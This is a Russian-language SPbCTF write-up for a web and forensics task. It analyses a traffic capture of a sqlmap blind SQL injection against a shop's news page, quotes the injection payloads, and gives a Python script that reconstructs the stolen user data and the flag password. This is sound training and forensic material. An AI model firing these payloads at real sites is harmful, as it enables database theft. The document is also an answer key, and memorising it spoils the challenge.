# Задание Web+Forensics для магистров

> Наш магазин взломали и украли базу! 
> К счастью, похоже, что атака была записана сетевым сенсором: https://.../attack_trace.pcap.xz
> 
> Проверьте наши подозрения, и в качестве доказательства предоставьте пароль пользователя VladRoskov37

Это задание одновременно на веб-уязвимости и форенсику — чтобы его решить, нужно уметь анализировать дампы сетевого трафика, и знать, как работают слепые SQL-инъекции.


## Осматриваемся

Нам дан файл attack_trace.pcap.xz — это архив XZ, а внутри файл с записью трафика PCAP, который умеют открывать инструменты для работы с трафиком. Мы будем использовать Wireshark.

Для того чтобы осмотреться в дампе трафика, удобно использовать статистику подключений: Statistics → Conversations. В дампе есть трафик только между хостами 192.168.192.1 и 192.168.192.64 — 8585 сессий на 192.168.192.64 порт 80/tcp (HTTP), это обращения к веб-сайту на сервере 192.168.192.64.

Проанализируем HTTP-трафик. Для этого в главном списке пакетов применим фильтр `http.request`, чтобы оставить в списке только HTTP-запросы, и пролистаем их. В этом трафике есть две группы запросов:  
− Вначале идёт обход всех страниц сайта и запросы на них с различными триггерами веб-уязвимостей. Это работает автоматический сканер Acunetix  
− Начиная с 181 секунды относительно первого пакета в PCAP, идут запросы к странице `/news.php` с меняющимся GET-параметром `?id=`. Это работает инструмент для автоматизации SQL-инъекций sqlmap, который использует найденную Акунетиксом уязвимость

Работа sqlmap начинается с поиска рабочего вектора для использования уязвимости, что видно как сильно меняющиеся значения параметра `id`:
```sql
3' AND (SELECT CHAR(109)||CHAR(121)||CHAR(80)||CHAR(66) FROM INFORMATION_SCHEMA.SYSTEM_USERS)='myPB' AND 'vGmj'='vGmj
3' AND (SELECT 'QtOe' FROM SYSMASTER:SYSDUAL)='QtOe' AND 'xKnk'='xKnk
3' AND (SELECT 'kzyR' FROM VERSIONS)='kzyR' AND 'rZvj'='rZvj
```

Начиная с 212 секунды, sqlmap начинает извлекать данные из базы через найденный вектор — слепую SQL-инъекцию, основанную на выводе на страницу:
```sql
3' AND ORD(MID((SELECT IFNULL(CAST(version() AS CHAR),0x20)),1,1))>64 AND 'ZgZH'='ZgZH
3' AND ORD(MID((SELECT IFNULL(CAST(version() AS CHAR),0x20)),1,1))>32 AND 'ZgZH'='ZgZH
3' AND ORD(MID((SELECT IFNULL(CAST(version() AS CHAR),0x20)),1,1))>48 AND 'ZgZH'='ZgZH
```


## Разбираемся с инъекцией

Слепая SQL-инъекция позволяет за один запрос ответить на один вопрос «да/нет» к базе. Sqlmap использует это так:
1. Берёт значение, которое требуется извлечь из базы: `version()`
2. Отрезает от него один символ: `MID(..., 1, 1)`
3. Берёт код этого символа: `ORD(...)`
4. Сравнивает код символа с каким-то порогом: `>64`
5. Если ответ сервера «да», значит код символа >64, и можно увеличить порог, например `>96`
6. Если ответ сервера «нет», значит код символа <=64, можно уменьшить порог: `>32`
7. Таким образом постепенно сужая границы символа, sqlmap определяет один символ за семь запросов
8. Переходит к следующему символу: `MID(..., 2, 1)`

sqlmap определяет «да» или «нет» по ответу сервера на запрос. Если запрос выполнился успешно, страница будет содержать текст новости:  
`<h2><a href='news.php?id=3'>Tactical image</a></h2><p><i>Posted on Thu, 31 Jan 2019 07:44:20 +0300</i></p>...`  
Это означает «да» от сервера. Если текста новости на странице нет, значит запрос не вернул результатов — «нет» от сервера.  
Для простоты, проверять результат можно по размеру ответа сервера. С новостью он >1700 байт, без новости <1350 байт.

В нашем файле первые 7 запросов и ответов сервера выглядят так:
```
− Символ из поля version() на позиции 1 больше 64? — Нет (знаем, что символ <=64)
− Символ из поля version() на позиции 1 больше 32? — Да (знаем, что символ >32 и <=64)
− Символ из поля version() на позиции 1 больше 48? — Да (знаем, что символ >48 и <=64)
− Символ из поля version() на позиции 1 больше 56? — Нет (знаем, что символ >48 и <=56)
− Символ из поля version() на позиции 1 больше 52? — Нет (знаем, что символ >48 и <=52)
− Символ из поля version() на позиции 1 больше 50? — Нет (знаем, что символ >48 и <=50)
− Символ из поля version() на позиции 1 больше 49? — Нет (знаем, что символ >48 и <=49 — то есть это 49, символ '1')
```

Чтобы решить задание на чистом Питоне, сделаем следующее:
1. Выгрузим информацию о запросах и ответах в текстовом виде, который будет удобно обрабатывать скриптом
2. Сопоставим каждому запросу ответ «да»/«нет» по размеру ответа
3. Определим каждый символ из запросов, наблюдая как sqlmap сужает границы (>64, >32, >48)
4. Склеим символы каждого значения в один результат, используя позицию символа MID(...)


## Выгружаем данные из Ваершарка

Для начала, выведем в списке пакетов в Wireshark только те данные, которые нам нужны — применим фильтр по HTTP и по времени пакета:  
`http && frame.time_relative > 212 && frame.time_relative < 331`

Для обработки запросов и ответов нам дополнительно упростит задачу следующее:
− Wireshark в списке пакетов выводит URL HTTP-запроса, и меняющийся параметр id попадает в него
− Определять размер ответа сервера мы можем также по размеру последнего пакета с HTTP-ответом: при наличии новости он 525 байт, при отсутствии 129
− Wireshark может выгрузить текстом список пакетов в том же формате, как он показывает его в интерфейсе

Выгрузим пакеты: File → Export Packet Dissections → As Plain Text  
Настройки: All Packets, Displayed, не Include column headings, без Packet Details. Получится такой текстовый файл, сохраним его как dump.txt:
```
  76404 212.225917     192.168.192.1         192.168.192.64        HTTP     384    GET /news.php?id=3%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29%3E64%20AND%20%27ZgZH%27%3D%27ZgZH HTTP/1.1 
  76407 212.229159     192.168.192.64        192.168.192.1         HTTP     129    HTTP/1.1 200 OK  (text/html)
  76416 212.264910     192.168.192.1         192.168.192.64        HTTP     384    GET /news.php?id=3%27%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28version%28%29%20AS%20CHAR%29%2C0x20%29%29%2C1%2C1%29%29%3E32%20AND%20%27ZgZH%27%3D%27ZgZH HTTP/1.1 
  76419 212.267468     192.168.192.64        192.168.192.1         HTTP     525    HTTP/1.1 200 OK  (text/html)
```

В этом файле у нас чередуется запрос и соответствующий ему ответ. В моём файле параметр id можно отрезать начиная с 100-го символа строки, а размер ответа — взяв три символа начиная с 76-го.


## Обрабатываем данные

Напишем скрипт, который обрабатывает этот текстовый файл и сшивает значения, извлечённые из базы:

```python
# ------ process.py ------
# encoding: utf-8

import urllib, re

id_values = []  # тут будут подряд значения параметра id
response_sizes = []  # здесь — подряд размеры ответа

## 1. Распарсим текстовый файл, вытащив запросы и размеры ответов
is_request = True
for line in open("dump.txt"):
    if is_request:
        id_values.append(line.rstrip()[100:-9])  # из строчки запроса извлечем значение id
    else:
        response_sizes.append(line.rstrip()[76:79])  # из строчки ответа — размер пакета
    is_request = not is_request  # в файле чередуются строчки запросов и ответов


yes_no_answers = {}  # словарь: запрос к базе → да/нет

## 2. Вытащим из значений id запрос к базе, а из ответов — да/нет
for i in range(len(id_values)):
    id_value = id_values[i]
    response_size = response_sizes[i]
    
    id_value = urllib.unquote_plus(id_value)  # раскодируем url-кодирование параметра
    res = re.search(r"3' AND (.+?) AND '", id_value)  # вытащим запросы
    db_request = res.groups()[0]
    
    if response_size == "525":  # определим ответ да/нет по размеру пакета
        is_yes = True
    else:
        is_yes = False
    
    yes_no_answers[db_request] = is_yes  # занесём в словарь


char_min_max = {}  # словарь: символ → [минимальное, максимальное] значение кода

## 3. Проследим за sqlmap, как он определял границы для отдельных символов
for db_request, is_yes in yes_no_answers.items():
    res = re.search(r"ORD\((.+?)\)>(\d+)", db_request)  # вытащим, код чего берётся, и с какой границей сравнивается
    db_char, margin = res.groups()
    margin = int(margin)
    
    if db_char not in char_min_max:  # если до этого символ не встречали, добавляем его с максимально раздвинутыми границами: 0—255
        char_min_max[db_char] = [0, 255]
        
    if is_yes:  # если было «да», символ > границы
        if char_min_max[db_char][0] < margin + 1:
            char_min_max[db_char][0] = margin + 1  # сдвигаем нижнюю границу до margin+1, если она была меньше
    else:  # если было «нет», символ <= границы
        if char_min_max[db_char][1] > margin:
            char_min_max[db_char][1] = margin  # сдвигаем верхнюю границу до margin, если она была больше
## После этого шага, для каждого символа минимальное и максимальное значение у нас должны быть равны — т.е. мы однозначно определили его код
    

db_strings = {}  # словарь: запрос к базе → собранный ответ

## 4. Соберём ответы из отдельных символов
for db_char, margins in char_min_max.items():
    res = re.search(r"^MID\((.+?),(\d+),1\)$", db_char)  # вытащим запрос к базе и позицию отрезаемого символа
    db_request, char_pos = res.groups()
    char_pos = int(char_pos)
    char_pos = char_pos - 1  # в MySQL позиции символов нумеруются с 1, а в Питоне с 0
    
    char_code = margins[0]  # границы равны, поэтому просто возьмём код символа из меньшей
    
    if db_request not in db_strings:  # если до этого не встречали запрос, добавляем его с пустым ответом
        db_strings[db_request] = ['']*100  # в Питоне нельзя писать символ в строку по индексу, поэтому пустой ответ — это массив из достаточного количества пустых строк
    
    db_strings[db_request][char_pos] = chr(char_code)  # ставим на соответствующее место ответа символ, код которого мы определили

for db_request, chars_array in db_strings.items():  # когда все символы собраны в массивы, сделаем из массивов строки
    db_strings[db_request] = ''.join(chars_array)  # для этого просто склеим все подряд символы в массиве
    

## 5. Мы готовы вывести собранные ответы для каждого запроса!
for db_request, db_response in db_strings.items():
    print "Request:", db_request
    print "Response:", db_response
    print
# --------- END ----------
```


Запустив этот скрипт на файле dump.txt, мы соберём запросы к базе и извлечённые через слепую инъекцию ответы:
```
Request: (SELECT IFNULL(CAST(lastname AS CHAR),0x20) FROM users LIMIT 8,1)
Response: Knox

Request: (SELECT IFNULL(CAST(firstname AS CHAR),0x20) FROM users LIMIT 6,1)
Response: Shurlocke
...
```


## Копаемся в данных

Найдём, каким запросом извлекли нужное нам имя пользователя:
```sql
Request: (SELECT IFNULL(CAST(login AS CHAR),0x20) FROM users LIMIT 3,1)
Response: VladRoskov37
```

Соответственно, нам нужен пароль, который также был извлечён на позиции LIMIT 3,1:
```sql
Request: (SELECT IFNULL(CAST(password AS CHAR),0x20) FROM users LIMIT 3,1)
Response: C0nGR4TZ_0n_PWn1nG_m3
```


Пароль пользователя VladRoskov37, который просят в задании: **C0nGR4TZ_0n_PWn1nG_m3**

Задание подготовлено сообществом SPbCTF ([vk.com/spbctf](https://vk.com/spbctf), Telegram: [@spbctf](https://t-do.ru/spbctf))
